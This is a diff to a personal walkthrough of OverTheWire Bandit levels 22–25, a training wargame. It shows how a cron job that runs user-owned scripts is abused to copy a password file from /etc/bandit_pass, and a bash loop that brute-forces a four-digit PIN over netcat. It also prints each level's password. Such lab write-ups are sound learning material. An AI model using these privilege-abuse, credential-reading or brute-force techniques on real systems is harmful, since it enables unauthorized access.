@@ -30,7 +30,11 @@ ssh bandit@bandit.labs.overthewire.org -p 2220
   - [L19 ssh \[cmd\]](#l19-ssh-cmd)
   - [L20 setuid](#l20-setuid)
   - [L21 netcat TCP Listener](#l21-netcat-tcp-listener)
-  - [L22 crontab](#l22-crontab)
+  - [L22 cron + Bash Script](#l22-cron--bash-script)
+  - [L23 cron + Bash Script](#l23-cron--bash-script)
+  - [L24 cron + Bash Script](#l24-cron--bash-script)
+  - [L25 Bruteforcing](#l25-bruteforcing)
+  - [L26](#l26)
 
 ## L0
 `ssh bandit0@bandit.labs.overthewire.org -p 2220`
@@ -740,13 +744,13 @@ Password matches, sending next password
 EeoULMCra2q0dSkYj561DX7s1CpBuOBt
 ```
 
-## L22 crontab
+## L22 cron + Bash Script
 > [!tip]
 > **GTK**
 >
-> - cron
-> - crontab
-> - cron.d
+> - `cron`
+> - `crontab`
+> - `cron.d`
 
 
 ```
@@ -765,3 +769,218 @@ bandit21@bandit:~$ file /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
 ```
+
+## L23 cron + Bash Script
+
+```bash
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh
+Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
+```
+
+So when i take a peek at `/tmp/8169b67bd894ddbb4412f91573b38db3`, i'm actually look at bandit22's password. 
+Now that this script runs on bandit23 too, so the passwd for bandit 23 must be there too. 
+
+```
+bandit22@bandit:~$ ls /tmp/
+ls: cannot open directory '/tmp/': Permission denied
+```
+
+Seems that we don't have permission for `/tmp/`. In that case, the passwd filename is reproduceable.
+
+```
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
+
+## L24 cron + Bash Script
+
+```bash
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*; #all files, hidden files
+do
+    if [ "$i" != "." -a "$i" != ".." ]; # $i is not `.` or `..`
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)" # display file status
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i # send signal (-s) SIGKILL (9) to ./$i after ruuning ./$i for 60s
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+from man pages
+```
+#stat
+    -f, --file-system
+            display file system status instead of file status
+    %U     user name of owner
+
+#timeout
+    -s, --signal=SIGNAL
+
+            specify the signal to be sent on timeout;
+
+            SIGNAL may be a name like 'HUP' or a number; see 'kill -l' for a list of signals
+```
+
+Seems that `/usr/bin/cronjob_bandit24.sh` can run scripts owned by user `bandit23` and delete them. Two possibilities comes to my mind:
+1) Some script already in that dir has output some information about the password somewhere, and we gotta find a way to execute that script. This possibility the ruled out because every script seems to be deleted after cron runs the scheduled jobs, which means nothing absolutely is in that dir.
+2) We can submit our script for it to be run by cron.
+Turns out option 2) is the right way to go. I've tested vim-saving a script in `~/` and `/usr/bin/`, and none seemed to work. However, files could be actually saved after `:w` in `/var/spool/bandit24/foo/`. 
+
+The next question is: what exactly should we put in this script. AFAIK, there's sure no sign of password in `/usr/bin/cronjob_bandit24.sh`. It's not like it could insert some piece of information somewhere during the execution. It struck me that we used to get out password from some `/tmp/` file. And rewind two levels, in Lv21->22, the password is given by
+```
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+So, This is what we should do too.
+
+```bash
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/password24
+```
+
+And wait a minute... (i mean, literally waiting for 60s...) Oh wait. `cat` is just carried out immediately before a `-9` KILL signal is sent to it. There's no need to wait.
+
+```
+bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/password24
+cat: /tmp/password24: No such file or directory
+```
+
+It ain't there! But not so fast. Remember last time when we need to operate in `/tmp/` and the wargame just asked us to use `mktemp`? Maybe we don't have permission to write in `/tmp/`.
+
+```
+bandit23@bandit:/var/spool/bandit24/foo$ echo can we write? > /tmp/canwe
+bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/canwe
+can we write?
+```
+
+Seems that we are indeed able to write. Seems that either this script is not run by cron, or /tmp/ is not a shared directory accross devices. 
+
+So I recreated the script in /tmp/, used `chmod 755` to open its execution perssion for everyone, and `cp`'d the script to `foo/` again.
+When I tried `cat /tmp/password24` again. It worked.
+
+```
+bandit23@bandit:~$ cat /tmp/password24
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
+## L25 Bruteforcing
+
+> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+Let's see how it works first.
+```
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80000
+Wrong! Please enter the correct current password and pincode. Try again.
+
+```
+
+This obviously need some coding, it's just i'm not sure yet whether I should use bash or this could be done within `nc`.
+
+
+Since `nc`'s TCP connection is just plaintext transmitting, `localhost:30002` is listening on whatever incoming connection and send
+```
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+```
+to the person who connects. After that, it's waiting for out STDIN to summit new information,
+and when we hit `\n`, the message is sent.
+From our point of view, in our endless rounds of trials, what we sent to `localhost:30002` could be cumulatively represented as a file
+```txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80000\ngb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80001\ngb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80002\n....
+```
+Or in print format:
+```
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80000
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80001
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80002
+...
+```
+The solution is to send him this file that 
+
+Let's test out hypothesis first:
+```
+bandit24@bandit:~$ cat /tmp/25try
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80000
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80001
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G80002
+
+bandit24@bandit:~$ nc localhost 30002 < /tmp/25try
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+```
+Great! `localhost:30002` is consuming our file as expected. Just that it's ignoring the first line, so our first line's gotta be a dummy.
+
+<!-- Now we need some knowledge for echo's formatted print.
+> [!tip]
+> Recall that`{0001..9999}` is a bash [expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html).
+> 
+> For echo, `-e` enables interpretation of backslash escapes, e.g. making us able to print `\n`. -->
+
+```bash
+#!/bin/bash
+
+PASSWORD24=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+echo dummy > /tmp/brute-force
+
+for i in {0000..9999}; do
+    echo ${PASSWORD24} $i >> /tmp/brute-force
+done
+```
+
+And then feed this file `/tmp/brute-force` to the checker.
+
+<!-- It seems that this method is not ideal, because the checker won't stop after receiving the correct answer, so the code is buried in the logs.
+
+However, we can still redirect the output to a log file, and use `uniq` to search for the password line.
+
+```
+$nc localhost 30002 < /tmp/brute-force | tee /tmp/log
+
+bandit24@bandit:~$ cat /tmp/log | sort | uniq -c
+1 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+  10002 Wrong! Please enter the correct current password and pincode. Try again.
+``` -->
+
+```
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Wrong! Please enter the correct current password and pincode. Try again.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+## L26
